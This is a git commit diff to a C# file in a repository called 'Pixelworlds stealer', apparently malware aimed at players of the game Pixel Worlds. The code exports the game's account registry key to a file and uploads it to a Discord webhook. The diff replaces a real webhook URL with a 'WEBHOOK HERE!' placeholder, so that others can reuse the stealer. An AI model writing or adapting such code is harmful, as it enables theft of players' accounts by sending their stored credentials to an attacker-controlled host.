81244fbe276d1e339d0e55908f243da775b975b4
Defiant <95227984+DefiantSkid@users.noreply.github.com>
2022-01-06 16:14:04 +0200

    Update Program.cs

--- Pixelworlds stealer/Program.cs
+++ Pixelworlds stealer/Program.cs
@@ -10,5 +10,5 @@ reg.ExportKey("HKEY_CURRENT_USER\\SOFTWARE\\Kukouri", "C:\\account.reg");
 
 using (WebClient client = new WebClient())
 {
-    client.UploadFile("https://discord.com/api/webhooks/928647457326370896/DWdjrz5g9GCJ9QV_Yq_T4wTfyLsK76lksoG77M8DTx8uV35DQ9ggWRj8XhU2DDXXbxex", "C:/account.reg");
+    client.UploadFile("WEBHOOK HERE!", "C:/account.reg");
 }
